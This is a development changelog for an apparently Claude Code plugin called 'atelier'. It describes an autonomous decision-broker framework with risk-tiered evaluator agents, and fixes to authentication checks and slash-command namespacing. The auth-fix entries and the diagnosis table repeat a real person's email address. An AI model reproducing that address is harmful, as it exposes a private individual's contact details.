- **`templates/atelier.template.json`** — new `decisionPolicy` block. Body: `{ "_comment": "...", "default": "ask", "byCategory": {} }`. The default is conservative — operators upgrading to v0.9.0 see no behavioural change until they actively opt-in via the interactive step (or `/atelier:set-policy` after the fact). The `_comment` explains how the broker uses the block (consumed by M4.26.c) and where the catalog lives (atelier-managed, operator does NOT edit).

- **`scripts/atelier-setup-project`** — new `step_decision_policy()` function inserted between `step_atelier_config_json` and `step_roadmap_files` in the main flow. The step:
  - Runs only when (a) `--skip-policy` flag NOT set, (b) `$NONINTERACTIVE` NOT true (no TTY → skip silently), (c) `ATELIER_CONFIG_STATUS == "created"` (do NOT re-prompt on preserved files), (d) catalog file readable under `$PLUGIN_ROOT/agents/decision-broker/catalog.json`.
  - Iterates over `jq -r '.categories | keys[]' "$catalog"` — bash 3.2-portable, no `mapfile`/`readarray`. Uses process substitution `< <(...)` which is bash 3.2 OK.
  - Per category prints (a) the category id in bold, (b) the human description, (c) the catalog's recommended `default`, (d) the `riskLevel`, (e) which model is used in auto mode. Then prompts `[a]uto / [f]ix-default / [s]ask?`.
  - Writes the answer to `.atelier.json` via `jq` atomic merge (mktemp + `mv`). The `"ask"` answer is omitted from `byCategory` (falls through to `decisionPolicy.default = "ask"`); only `"auto"` and fixed option ids are written.
  - Sets `POLICY_STATUS` to one of: `configured`, `skipped (--skip-policy)`, `skipped (non-interactive)`, `skipped (.atelier.json <prior-status>)`, `skipped (catalog missing — re-run install.sh)`, `skipped (catalog malformed)`. Surfaced in the final summary.

- **`scripts/atelier-setup-project` flag** — `--skip-policy` parsed at the top of the script and documented in `usage()`. Pattern matches the existing flags (no value; sets `SKIP_POLICY=true`).

- **`commands/set-policy.md`** — new slash command `/atelier:set-policy [category]`. Used by operators who (a) ran setup-project before M4.26.b shipped, (b) used `--skip-policy` and now want to configure, or (c) want to revise a single answer without re-running the full setup. Walks the same per-category prompt as the bash step but via `AskUserQuestion` (richer UI than read in a shell). Adds a "Keep current" option to each category prompt when a non-default value is already set, so the operator can revise one category without re-answering the others.

- **`scripts/atelier-setup-project` minor fix** — the final-summary `sublog` line said *"run /next-task"* (bare slash command, would hit the F44 bug). Corrected to `/atelier:next-task`. Caught during F45 audit but missed because it lives in the script body, not in the prose I swept. F45 grep didn't include `scripts/`.

**Decisions captured:**

- **`POLICY_STATUS` gates re-prompt on idempotent re-runs.** Re-running `/atelier:setup-project` after an initial successful run is supposed to be a quiet no-op for files that already exist. Walking the catalog again would surprise the operator. The gate `ATELIER_CONFIG_STATUS == "created"` ensures the step only runs the first time `.atelier.json` is freshly written. After that, `/atelier:set-policy` is the right surface for revisions.
- **`"ask"` answer deletes the entry rather than writing it.** Equivalent semantics (no entry in `byCategory` → fall through to `decisionPolicy.default = "ask"`), smaller file. Trade-off: a reader of `.atelier.json` doesn't see *"the operator explicitly said ask for this category"* — they see no entry. Accepted because the default is `"ask"` and the file is mostly read by the broker, not by humans.
- **Catalog is read at setup-project time, not at .atelier.json creation time.** The `byCategory` block lives separately from the catalog; if a future atelier version adds a category that wasn't in the catalog when the operator set up the project, the new category gets the global default (`"ask"`) and the operator can opt-in via `/atelier:set-policy <new-category>` when they're ready. This avoids forcing operators to re-walk every project every time the catalog grows.
- **`commands/set-policy.md` is prose-driven, not bash-driven.** The setup-project step is bash (no LLM cost, immediate); the slash command is an agent prose that uses `AskUserQuestion`. Two paths for the same configuration because the contexts differ: setup-project is one-shot during initial scaffolding (bash is faster), the slash command is operator-initiated for ad-hoc revisions (the richer UI makes one-off edits easier).
- **No `Bash(jq:*)` allowed-tools dependency in the slash command body.** The `set-policy.md` says the agent "uses `jq` through `Bash`" but specifies `Edit` for the actual write. This goes through atelier's standard write path (M2.4 hooks fire, settings.json allow/deny matrix applies). A direct write via `Bash(jq | tee)` would bypass that — wrong shape for a configuration command.

**Plugin scope:** plugin-layer (`templates/`, `commands/`) + script-layer (`scripts/atelier-setup-project`). No agent, skill, hook, install.sh change. **Plugin version stays at 0.9.0** — per the operator's directive, the M4.26 series ships as a single release after `.e` merges. The manifest stays aligned with head-of-main but the release is deferred.

**Verified locally:**

- `bash -n scripts/atelier-setup-project` syntax-clean.
- `jq empty templates/atelier.template.json` valid JSON.
- The new `step_decision_policy()` uses only bash 3.2-compatible constructs (`while IFS= read; do ...; done < <(...)` — verified against the M4.16-era F33 lesson where `mapfile` was bash-4-only).

**Operator-visible:**

After this PR merges and the operator runs `/atelier:setup-project` on a NEW project, the script walks through each catalogued category and asks `[a/f/s]`. Existing projects (already configured) see no change — `/atelier:set-policy` is the path for them. The `.atelier.json` files of existing projects keep their absent `decisionPolicy` block, which the broker (when M4.26.c lands) treats as the conservative "fall back to ask" default.

**Follow-up paths:**

- **M4.26.c** (queued) — integrate the broker skill into `task-orchestrator`, `pr-author`, and `unblocker`. The `decisionPolicy` block written by this PR becomes consequential when the specialists invoke `Skill(decision-broker)` instead of `AskUserQuestion` for catalogued situations.
- **M4.26.d** (queued) — panic switch + task wrapper flags.
- **M4.26.e** (queued) — PR-body audit section + docs.

### M4.26.a — Decision broker base: catalog + skill + three risk-tiered evaluator agents (Haiku / Sonnet / Opus) — 2026-06-02
**PR:** [#120](https://github.com/AkaLab-Tech/atelier/pull/120)

First slice of M4.26 — the framework that lets atelier make **strategic decisions** (situations with several legitimate options) autonomously instead of always asking the operator. Sub-milestone `.a` ships the **base** (catalog, skill, evaluator agents) without integration; the specialists still use `AskUserQuestion` directly. The follow-up PR (M4.26.b-e) wires the skill into `task-orchestrator`, `pr-author`, `unblocker`, adds the `setup-project` policy step, the `.atelier.json` schema, the `/atelier:abort-auto` panic switch, and the `--policy` / `--ask-for` task wrapper flags.

**Why split.** Bundling all five sub-milestones (~10-12 files modified, agents + skill + scripts + commands + docs) would have tripped the AND-gate (>200 lines AND >10 files). Shipping `.a` independently keeps the size envelope reviewable and means the operator can read the base design (catalog + agents + skill) without also reviewing the integration churn at the same time. The base ships dormant — operators upgrading to v0.9.0 see no behavioural change until M4.26.b-e lands.

**Why M4.26.** Discovered during the M7.1 dogfood Nivel 4 (real task on storefront, post-v0.8.5). The agent surfaced a strategic question to the operator: a pre-existing lint error on `main` (10 errors in `apps/admin/ProductForm.tsx`, ajenos al PR del task) blocked the gate. The agent offered four options: pause-and-fix-baseline-first / override / scope-package-narrower / abort. The operator's reaction: *"el agente suele preguntar cosas, como esta por ejemplo. Ya me hizo algunas preguntas así, que no tienen nada que ver con allow / deny / ask. Esto podemos pasarlo por un evaluador autónomo y que no pregunte al operador? Quizás podríamos hacerlo configurable?"*

The friction is real and growing as auto-mode (M2.8) removes the per-Bash prompt that historically masked it. Operator wants the strategic-question class of friction handled the same way M2.8 handled the permission-prompt class: configurable per project, with a default sensible enough that most operators never have to think about it.

**Delivered (M4.26.a):**

- **`agents/decision-broker/catalog.json`** — atelier-maintained registry of strategic-decision categories. Five entries shipping in v0.9.0: `baseline-conflict` (low risk), `oversize-handling` (low risk), `scope-creep-detected` (medium risk), `merge-conflict-tracking` (low risk), `merge-conflict-substantive` (high risk). Each entry: human description, options[] (each with id + label + when-it-applies guidance), default option, riskLevel (low|medium|high), model (haiku|sonnet|opus). Schema documented inline. **Operators do NOT edit this file** — categories are added by the maintainer when dogfood surfaces a new strategic-decision class.
- **`agents/decision-broker-low-risk.md`** — Haiku 4.5 evaluator. Used when the catalog category has `riskLevel: low` AND the operator's policy is `auto`. Reads catalog + briefing context, returns `{choice, rationale, deviated_from_default, confidence}` JSON. Hard refusal to take the action — broker is decision-only. Tools: `Read, Glob, Grep` (no Bash, no Edit, no Write — strictly read-only and strictly non-actionable).
- **`agents/decision-broker-medium-risk.md`** — Sonnet 4.6 evaluator. Same protocol as low-risk; differences captured in the agent's own prompt (deviates from catalog default more often, may use Read/Glob/Grep for 2-3 extra context reads beyond the briefing, calibrates confidence around `medium`). Used for categories like `scope-creep-detected` where "in scope vs prerequisite vs creep" requires diff-reading judgement.
- **`agents/decision-broker-high-risk.md`** — Opus 4.8 evaluator. Same protocol; differences: `ask` is a respectable choice (high-risk catalog entries usually default to `ask` and the operator overrides to `auto` explicitly), `confidence: low` triggers fallback to `ask` if the catalog supports it, has read-only Bash for `git log` / `git show` / `git diff` (no write subcommands), rationale must cite specific signals (file paths, sha, line numbers). Used for substantive merge conflicts on real code where the cost of a wrong call dominates the cost of asking.
- **`skills/decision-broker/SKILL.md`** — the despatcher. Reads `.atelier.json`'s `decisionPolicy` for the category, the catalog entry, and the panic flag at `<worktree>/.atelier-abort-auto.flag`. Resolves in this order: (1) panic flag → `mode: panic`, fall back to operator; (2) category not catalogued → `mode: ask`, surface to operator (and signal the maintainer); (3) project policy is a fixed option id → `mode: direct`, return the option immediately; (4) policy is `auto` → dispatch to the right-risk-tier broker agent → `mode: auto`; (5) policy is `ask` or missing → `mode: ask`. Logs every resolution to `<worktree>/.task-log/decisions.jsonl`.

**Decisions captured:**

- **Three agents, not one with variable model.** Claude Code's plugin frontmatter pins the model per agent file (e.g. `model: opus`); there is no way to vary it at runtime within a single agent file. So the skill picks among three pre-defined agents based on `riskLevel`. Operationally clean and lets the operator (or maintainer) see exactly which model each risk tier uses.
- **Model scaling by risk, not by cost.** Haiku/Sonnet/Opus mapping is justified by *what the broker has to reason about*, not by *how often it gets called*. Low-risk decisions resolve mostly to the catalog default (Haiku is enough); medium-risk requires diff reading (Sonnet); high-risk affects production state and the rationale will be read carefully by the operator later (Opus's calibration and quality of rationale matter).
- **The skill is the sole entry point; agents do NOT take the action.** Anywhere in the spec where "the broker decides X" is written, the caller is the one that acts on the choice. This preserves auditability — every decision goes through the same log file with the same shape, and a misbehaving evaluator agent cannot silently change project state.
- **Catalog is atelier-managed, not operator-extensible.** Per the operator's explicit answer during the design conversation. Trade-off: when dogfood surfaces a category not in the catalog, the broker falls back to `ask` and the maintainer adds the entry in a future version. The catalog growth signal (categories surfaced as `ask` because not catalogued) lives in the decisions.jsonl log — a future `atelier-doctor` check could surface uncatalogued-category frequency.
- **`decisionPolicy.<category>` accepts three shapes**: a fixed option id (`"fix-first"`), the string `"auto"`, or the string `"ask"`. A fourth value (`"<option.id>" that is not in the catalog`) is treated as `"ask"` with a warning rationale — defensive against catalog drift or operator typo.
- **Panic flag is a file, not an env var.** Env vars do not propagate from a slash command (which runs inside the Claude session) back to subprocesses cleanly. A flag file at a well-known path works regardless of how the broker is invoked downstream. The `/atelier:abort-auto` slash command (M4.26.d) writes this file; the skill checks for it first on every resolution.
- **The base ships dormant.** No specialist agent in v0.9.0 actually calls the skill; the integration is M4.26.b-e (separate PR). This gives the operator a clean read of the framework before the call-sites land, and lets us iterate on catalog entries without disturbing the orchestrator's flow.
- **Pre-existing M2.4 hooks and the static permission matrix are NOT inside the broker's scope.** Those gates remain the safety net for what is FORBIDDEN; the broker is the policy layer for what is AMBIGUOUS. `safe-package-change rejected` does NOT go through the broker — it stays at the hook layer where the threat-model addendum in PLAN.md §3 lives.

**Plugin scope:** plugin-layer only (catalog + skill + agents). No install.sh / scripts / hooks / template / operator-rules / docs change. Plugin **minor bump 0.8.5 → 0.9.0** per PLAN.md §14.2 — adds new capabilities (the decision-broker framework) even though the integration is dormant. Cut **release v0.9.0** post-merge so the catalog and the agents are discoverable to plugin consumers ahead of the M4.26.b-e PR.

**Verified locally:**

- `jq empty agents/decision-broker/catalog.json` — valid JSON; 5 categories present.
- Each agent's frontmatter has `name`, `description`, `model`, `tools` — matches the shape Claude Code requires for plugin agents (cross-checked against `agents/reviewer.md` and `agents/task-orchestrator.md`).
- The skill's resolution algorithm walks through the 5-step ordering deterministically; the JSONL log schema is fully specified.

**Operator-visible:**

After this PR merges and v0.9.0 ships, the operator picks up the new agents and skill via `atelier-update`. The behaviour does NOT change yet — `task-orchestrator`, `pr-author`, etc. still ask the operator directly for strategic decisions. The framework is in the plugin, ready to be wired in. The operator may inspect the catalog (`cat $CLAUDE_PLUGIN_ROOT/agents/decision-broker/catalog.json`) to understand the categories atelier knows about.

**Follow-up paths:**

- **M4.26.b** — `templates/atelier.template.json` gains a `decisionPolicy` block with default `{ "default": "ask" }` (conservative). `scripts/atelier-setup-project` adds an interactive step that walks the operator through each catalog category and writes the per-category answer to the project's `.atelier.json`. Operator-facing UX in plain language; the catalog's technical shape stays internal.
- **M4.26.c** — Integration: `task-orchestrator`, `pr-author`, `unblocker` invoke the broker skill via the `Skill` tool when they would have called `AskUserQuestion` for a catalogued strategic decision. The pre-existing `AskUserQuestion` path stays as the fallback for `mode: ask` and `mode: panic`.
- **M4.26.d** — Panic switch (`/atelier:abort-auto` slash command writes `<worktree>/.atelier-abort-auto.flag`; complementary `/atelier:resume-auto` removes it). `task()` shell wrapper extended with `--policy=auto|ask` and `--ask-for=<categories>` flags (shellrc hooks-version bump 4 → 5, F36-style atomic with the comparator).
- **M4.26.e** — `pr-author` reads `<worktree>/.task-log/decisions.jsonl` and adds an `## Autonomous decisions taken` section to the PR body with one row per decision (category, choice, rationale, confidence, model). `operator-rules.md` gains a "Decision policy" section.

### M7.1.F44 + F45 — `task()` wrapper invoked `/next-task` without the `atelier:` namespace + sweep of bare slash refs across operator-copiable prose — 2026-06-02
**PR:** [#119](https://github.com/AkaLab-Tech/atelier/pull/119)

Two related findings bundled into one PR. F44 surfaced first during M7.1 dogfood Nivel 4 (task lifecycle end-to-end) as a hard failure; F45 was found by auditing the rest of the repo for the same pattern after the operator asked *"revisa otros patrones similares que puedan fallar por lo mismo"*.

#### F44 — `task()` shell wrapper missing the plugin namespace

After v0.8.4 (F43) shipped and the auth chain was reporting truth, the operator ran `task` from `~/Work/storefront` for the first time. Claude Code arrived at the project under the right config dir (CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR), auto-mode on, Opus 4.8 — and the initial slash prompt the wrapper passed died with `Unknown command: /next-task`.

**Root cause (F44):**

[install.sh:1390](install.sh) (the shellrc heredoc that defines the `task()` shell function) ended with:

```bash
claude "/next-task $*"
```

But the plugin exposes the command as `/atelier:next-task` (the `atelier:` prefix is the plugin namespace Claude Code requires for plugin-registered slash commands). The bare `/next-task` name worked at some pre-plugin point in atelier's history; nothing updated the wrapper when the surface moved to plugin form. Every operator who used `task` for the first time hit this — but until M7.1 dogfood Nivel 4 nobody had actually exercised the wrapper in the new plugin layout end-to-end (typing slash commands by hand with `/atelier:next-task` worked, masking the bug).

**Delivered (F44):**

- **`install.sh` shellrc heredoc (`task()` body)** — `claude "/next-task $*"` → `claude "/atelier:next-task $*"`. One-character class of fix; the namespace prefix is now correct.
- **`install.sh` shellrc hooks version bump** — `# atelier-hooks-version: 3` → `4` (the heredoc text) AND `local current_version=3` → `4` (the F7c comparator). Bumped together per the F36 invariant: the heredoc value goes into newly-installed blocks, the `current_version` is what F7c compares the operator's existing block against. If the comparator stays at the old value, F7c sees `existing == current` and silently skips the refresh — exactly the bug F36 documented. F44 honors that lesson.

#### F45 — Sweep of bare slash refs across operator-copiable prose

After F44 fixed the only auto-injected slash command in the codebase (the `task()` wrapper), the operator asked for an audit of similar patterns. The grep showed a mixed-namespace repo:

| Slash command | bare refs (pre-F45) | namespaced (pre-F45) |
|---|---|---|
| `/finish-task` | 8 | 0 |
| `/validate` | 19 | 0 |
| `/next-task` | 15 | 8 |
| `/resume-task` | 11 | 9 |
| `/setup-project` | 13 | 22 |

Three categories of bare references emerged:

1. **Operator-copiable** — error messages, GitHub issue body templates, slash-command recommendations in agent prose (*"run /resume-task next"*). If the operator reads these literally and types them, they hit the F44 bug a second time at a different entry point.
2. **Self-references** — `commands/<name>.md` saying *"You are running the `/<name>` slash command"*. The agent has already been invoked with the namespace correctly; the prose is inert. No UX impact.
3. **`/status` and `/doctor` ambiguity** — Claude Code ships built-in `/status` (session UI) and `/doctor` (auto-updater). Bare references in `docs/troubleshooting.md` and `docs/research/permission-layer-3.md` correctly point at the built-ins. The plugin counterparts are `/atelier:status` and `/atelier:doctor`.

**Delivered (F45):** namespaced **only** the operator-copiable category. Self-references and built-in references left bare on purpose.

- `commands/status.md` — operator-recommendation lines for `/atelier:next-task` and `/atelier:setup-project`.
- `commands/finish-task.md` — edge-case suggestions (`/atelier:resume-task <id>`, `/atelier:next-task first`).
- `commands/slice-task.md` — refusal-error message text (`"/atelier:slice-task must be run from the main worktree..."`).
- `commands/resume-task.md` — commit-message template (`via /atelier:resume-task`) and final status block header (`✓ /atelier:resume-task <id>`).
- `agents/unblocker.md` — GitHub-issue body strings (operator reads in the rendered issue), bullet points telling the operator what to type.
- `agents/task-orchestrator.md` — OVERSIZE error-message option (a) telling operator to *"re-run /atelier:next-task on each"*.
- `skills/task-discovery/SKILL.md` description field — semantic match hint updated to `/atelier:next-task` so Claude Code resolves the skill correctly on plugin-namespaced triggers.
- `skills/pr-flow/SKILL.md` description — `/atelier:finish-task`.
- `skills/safe-commit/SKILL.md` body — caller list mentions `/atelier:finish-task`.
- `skills/retry-with-logs/SKILL.md` — refers to `/atelier:resume-task` consumer.
- `skills/visual-validation/SKILL.md` — refers to `/atelier:setup-project` writing `.gitignore`.
- `hooks/safe-commit.sh` docstring — `/atelier:finish-task`.
- `hooks/patterns/safe-package-change.json` description — `/atelier:setup-project`.
- `operator-rules.md` — three op-facing mentions (`/atelier:setup-project`, two `/atelier:next-task`).
- `docs/dogfood-guide.md` — corrected the `claude '/next-task #1'` invocation example (was a literal copy-paste bug like F44), plus four flow-step descriptions and two TC table cells. Also corrected three `/doctor` references in Stage 2 — those were ambiguous between Claude Code built-in and atelier wrapper; in context (atelier dogfood), the intent is `/atelier:doctor`.

**Decisions captured:**

- **Bump both versions atomically (F44).** Lesson from F36 (which itself was the cleanup of an F34 mistake that bumped only the heredoc). The pattern is: when you change anything inside the heredoc, increment both the heredoc literal and the comparator. The block comment above `current_version` already says this; F44 follows it.
- **No `atelier()` wrapper change (F44).** The `atelier()` shell function passes args through verbatim to `claude` and does NOT inject a default slash command (operators type the slash they want, e.g. `atelier /atelier:doctor`). The bug was specific to `task()` which DOES inject one. Read all 4 occurrences of slash-command invocations in install.sh's heredoc to confirm only `task()` is affected.
- **F45 namespaces only operator-copiable prose.** The categorisation (operator-copiable vs self-reference vs built-in) above is the gate for every edit. Wholesale find+replace of `/next-task` → `/atelier:next-task` would have broken the `commands/next-task.md` self-references unnecessarily and would have damaged the `docs/troubleshooting.md` mentions of Claude Code's built-in `/status`. F45 read each match in context before editing.
- **F45 keeps self-references bare for brevity.** The agent is already loaded with the namespace when it reads its own command body; spelling it out everywhere would be noise without changing behaviour.
- **F45 keeps Claude Code's built-in `/status` and `/doctor` references intact in research/troubleshooting docs.** Those mentions point at Claude Code's UI (Config tab, Status tab, Usage tab), not at atelier's plugin commands. Namespacing them would be wrong.
- **No `docs/operator-guide.md` change for either F44 or F45.** The guide already says `task` "just works"; F44 makes that true. The error message Claude Code printed (`Unknown command: /next-task`) was informative enough that the operator could route to `/atelier:next-task` manually if needed. F45 fixed the dogfood-guide where the operator was likely to copy the wrong invocation.

**Plugin scope:** host-OS-layer change to `install.sh` (F44) + plugin-layer prose touches across `commands/`, `agents/`, `skills/`, `hooks/`, `operator-rules.md`, and `docs/dogfood-guide.md` (F45). No agent / skill / command / hook script logic changed — only docstrings, descriptions, error messages, and recommendation lines. No template touched. Patch bump **0.8.4 → 0.8.5** per PLAN.md §14.2. Cut **release v0.8.5** post-merge — same rationale as F43: every operator using `task` to start a task hits the F44 bug on first try, and `task` is the operator-facing entry point of the entire system. The F45 bundle adds defence-in-depth so the same class of bug doesn't recur at a different operator-facing surface.

**Verified locally:**

- `bash -n install.sh` syntax-clean.
- `grep -nE "current_version=|atelier-hooks-version:" install.sh` confirms both lines at `4`.
- `grep -E 'claude "/' install.sh` confirms the only auto-injected slash command in the heredoc is now `/atelier:next-task` (no other bare slash names left).
- Post-F45 grep across operator-copiable surfaces shows zero remaining bare references to `/finish-task`, `/resume-task`, `/slice-task` in any prose an operator might copy. Remaining bare references are all self-refs inside `commands/<name>.md` (the command names itself) or system-level descriptions inside `agents/task-orchestrator.md` (the orchestrator's internal flow), neither of which trips F44-shape failures.

**Operator-visible:**

After this PR merges and the operator picks up v0.8.5 via `atelier-update` plus `./install.sh` (the F7c re-inject path), the `task()` shell function in their `~/.zshrc` is refreshed to invoke `claude "/atelier:next-task $*"`. From the next `task` invocation, the lifecycle proceeds past the slash-command dispatch into `task-orchestrator` instead of dying with `Unknown command`.

**Follow-up paths:**

- **Audit other auto-injected slash commands.** F44 only touched `task()`. If any future shell wrapper auto-injects a slash command, the same plugin-namespace rule applies. Captured here for the next maintainer adding an entry point: `atelier-resume` (hypothetical), `atelier-next-blocker` (hypothetical), etc. would need `/atelier:resume-task`, `/atelier:next-blocker`, etc.
- **post-update propagation of project settings.** Separately raised by the operator during the same dogfood session: `atelier-update` refreshes `$ATELIER_CONFIG_DIR/templates/` but does not propagate the refreshed template to the registered projects' `.claude/settings.json`. Deferred to its own milestone (provisionally M7.1.F45) once the operator decides on the UX (auto, opt-in flag, or stay manual).

### M7.1.F43 — `install.sh` + `atelier-doctor` Claude-auth check was a local-only file read, missed expired/revoked tokens — 2026-06-02
**PR:** [#118](https://github.com/AkaLab-Tech/atelier/pull/118)

Discovered immediately after v0.8.3 (F42) shipped and the operator went through the upgrade flow. F42 had correctly switched all `claude auth …` calls to use `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR`, but **all of them still relied on `claude auth status`**, which only reads the local `.claude.json` file and confirms the presence of an `oauthAccount` block. It does NOT validate the OAuth access token against the Anthropic API. So when the operator's atelier-scoped token had been revoked or expired server-side, every check still reported success — and the very next agent session failed with `Please run /login · API Error: 401 Invalid authentication credentials`.

Operator's framing was exact: *"si el login está mal, el install.sh debe saberlo y pedirme que me logee, y si atelier-doctor dice que está mal, también"*. F42 had moved the false positive from "wrong config dir" to "right config dir, but no server-side validation". F43 closes the gap.

**Diagnosis** (recorded for the next person who hits a similar shape):

| Check command | Result on operator's broken state |
|---|---|
| `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR claude auth status` | `{"loggedIn": true, "email": "miguelmail2006@gmail.com", "orgId": "...", "subscriptionType": "max"}` ← **success** |
| `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR claude -p "ok" --output-format json --max-turns 1` | `{"is_error": true, "api_error_status": 401, "result": "Failed to authenticate. API Error: 401 Invalid authentication credentials"}` ← **realistic failure** |

`auth status` is a local-only file read; only an actual API ping detects expired/revoked tokens. The fix is to do both: cheap local check first (no point hitting the API if the file is missing), then real API ping if the file says OK.

**Cost of the deep check**: ~3s of wall-clock + $0 in tokens **when auth fails** (the model is never invoked — the call is rejected at the auth gate). ~3s + a trivial token cost (~50 input + ~5 output, ~$0.001) **when auth succeeds**. Acceptable for install-time and doctor-time checks; would NOT be acceptable in a per-session preflight. The check runs at exactly two points: install.sh Phase B (once per install) and `atelier-doctor` (operator-initiated).

**Delivered:**

- **`install.sh` — new helper `_phase_b_claude_api_ping`** that runs `claude -p "ok" --output-format json --max-turns 1`, parses `api_error_status` from the JSON, and returns 0/1 accordingly. Single source of truth for the deep check; reused by Phase B and Verification.
- **`install.sh` Phase B — `phase_b_claude_login`** now does a real API ping after the local `auth status` succeeds. Three paths:
  1. Local status OK + API ping OK → behave as before (offer to switch accounts interactively, skip in non-interactive mode).
  2. Local status OK + API ping returns 401 → `warn` about the stale credentials, log out the broken auth, force a fresh login. Non-interactive mode dies with a clear message pointing at the manual command.
  3. Local status fails → fresh-login path unchanged.
- **`install.sh` Verification — `phase_verify`** now emits two separate `step_ok`/`step_fail` lines: `atelier claude auth status (local)` and `atelier claude auth (API ping)`. If the API ping fails, the operator sees `✗ atelier claude auth (API ping returned 401 — token expired or revoked, re-run install.sh)` instead of a misleading `✓`.
- **`scripts/atelier-doctor` — `check_atelier_claude_auth`** rewritten with the same two-step pattern. The deep-check failure produces a `push_fix_manual` containing both `claude auth logout` and `claude auth login`, properly ordered (logout first so the next login overwrites cleanly).

**Decisions captured:**

- **Reuse the same `claude -p` ping in install.sh + doctor.** A different probe in each tool would risk drift; the symptom they're catching is identical. The helper lives in `install.sh` (not a shared shell library) because there is no shared library between `install.sh` and `scripts/atelier-doctor`; copying ~10 lines is cheaper than introducing one.
- **`push_fix_manual` not `push_fix_auto` for the doctor.** Same call as F42: `claude auth login` is interactive (browser-based). Auto-fixes are supposed to run silently. Manual is the correct affordance.
- **Run the deep check unconditionally in Phase B + Verification + doctor, not behind a flag.** The whole point of F43 is to stop reporting false positives. A flag-gated deep check would mean the operator has to know to ask for it, which defeats the purpose. The ~3s cost is acceptable at install/doctor time.
- **Skip the deep check in non-interactive mode (`--yes`/no TTY) for the "local OK + API 401" branch.** The fix is interactive (browser flow); auto-mode cannot complete it. Instead we `die` with the manual command. This preserves the property that automated CI/scripted installs fail loud instead of silently leaving a broken auth in place.
- **No update to operator-rules.md or operator-guide.md.** The new check messages explain the situation in the moment the operator sees it. Documentation duplication would just go stale.
- **No `apiKeyHelper` / `ANTHROPIC_API_KEY` special-case.** Operators using an API key instead of OAuth (the `--bare` flow per `claude --help`) are not the target case; if a future user runs atelier under API-key auth the `auth status` check still works and the API ping uses that same key. Defer if it ever surfaces.

**Plugin scope:** host-OS-layer (`install.sh`) + plugin-layer (`scripts/atelier-doctor`). No agent, skill, command, hook, or template touched. Patch bump **0.8.3 → 0.8.4** per PLAN.md §14.2 — bug fix in a check that was previously reporting false positives; operator-visible behaviour shift is "the truth, finally". Cut **release v0.8.4** because the bug class blocks every new operator hitting the install on a stale-token host.

**Verified locally:**

- `bash -n install.sh` syntax-clean post all edits.
- `bash -n scripts/atelier-doctor` syntax-clean.
- The new `check_atelier_claude_auth` exercised inline against the operator's currently-broken host (atelier-scoped token returning 401 from the real API) — correctly reports `✗ atelier Claude auth invalid (Anthropic API returned 401 — token expired or revoked)` and emits the correct manual-fix command pair. Pre-F43 the same host reported `✓ atelier Claude auth valid (account: miguelmail2006@gmail.com)` — the false positive that motivated this PR.

**Operator-visible:**

After this PR merges and the operator picks up v0.8.4 via `atelier-update` and re-runs `install.sh`:

1. **Phase B** runs the local check first; if it passes, immediately runs `_phase_b_claude_api_ping`. On a broken token: `⚠ atelier Claude token is present but Anthropic API rejected it (401 — token expired or revoked)` + `⚠ logging out the stale credentials and starting a fresh login` + browser opens. On a healthy token: `↷ atelier Claude Code already authenticated (token verified, keeping existing account)`.
2. **Verification phase** prints two distinct lines: `atelier claude auth status (local)` and `atelier claude auth (API ping)`. The second one is the new truth-telling one.
3. **`atelier-doctor`** reports `✓ atelier Claude auth valid (account: <email>, API ping OK)` when both checks pass, or `✗ atelier Claude auth invalid (Anthropic API returned 401 — token expired or revoked)` with the manual fix command otherwise.

The specific scenario that triggered F43 — the operator running `install.sh` after F42, seeing all greens, then hitting 401 inside `atelier /atelier:doctor` — is now impossible: either install.sh repairs the auth itself (interactive path), or it dies clearly pointing at the manual relogin command (non-interactive path).

**Follow-up paths:**

- **Mid-session 401 detection.** F43 catches stale tokens at install/doctor time. A token can still go bad mid-session (rare but possible). The proper fix is a `PostToolUse` hook that detects 401s in tool outputs and surfaces a structured error to the agent. Defer until the symptom recurs in production.
- **Account-level mismatch warning.** F43's API ping does not currently warn if the local-file account differs from the API-reported account (e.g. operator logged out elsewhere with a different account). Deferred — the symptom is rare and the operator's intent is recoverable with a logout + login.

### M7.1.F42 — `install.sh` Phase B (and verification + Phase C.2) was validating the operator's personal Claude auth instead of the atelier-scoped one — 2026-06-02
**PR:** [#117](https://github.com/AkaLab-Tech/atelier/pull/117)

Discovered immediately after v0.8.2 (F39 + F41) was released and the operator went through the post-merge upgrade flow on storefront. `install.sh` reported *"Claude Code already authenticated as miguelmail2006@gmail.com. Keep (Y) or switch to another account (s)?"* and `atelier-update` reported success. But the very next command — `atelier` + `/atelier:doctor` inside storefront — failed with `Please run /login · API Error: 401 Invalid authentication credentials`. The operator's reaction was the right one: *"no debería haber pasado, el install y el update deberían validar el login de forma correcta, porque entonces esto está mal"*.

**Root cause:**

[install.sh:728](install.sh) (the pre-F42 line numbering) called `claude auth status` and `claude auth login` **without prefixing `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR`**. By default, `claude` reads `~/.claude/.claude.json` — the operator's *personal* config directory. So Phase B's idempotency hinge was checking the wrong file: it confirmed the operator's personal auth, never validated `$ATELIER_CONFIG_DIR/.claude.json` (the file every `atelier`-launched session actually loads, because the shell wrapper sets `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR`).

This produced a class of failures that looked like "auth flapping" but were really "the auth I just verified is not the auth that gets used":

- A fresh-machine install would leave `$ATELIER_CONFIG_DIR/.claude.json` either absent or with whatever OAuth state happened to land there incidentally during Phase C.2's `claude plugin install` calls.
- A re-install (idempotency path) on a host where the operator had once logged in to atelier manually would happily report "already authenticated" by reading the personal config — even if the atelier-scoped token had since expired or rotated. The 401 would only surface on the first real session API call.

The post-install Verification phase had the same blind spot (`verify_cmd "claude auth status" claude auth status`), as did Phase C.2's pre-flight guard before installing plugins.

**Delivered:**

- **`install.sh:phase_b_claude_login`** — every `claude auth status` / `claude auth logout` / `claude auth login` invocation now prefixes `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"`. Five call sites in this function were updated. The interactive prompts now say "**atelier** Claude Code already authenticated as …" so the operator knows which config dir is being validated. The fresh-login sublog now also says *"this is separate from your personal ~/.claude/ login"* on the no-prior-auth path, since the operator may legitimately end up with two auths for the same account (one for personal claude, one for atelier-scoped claude).
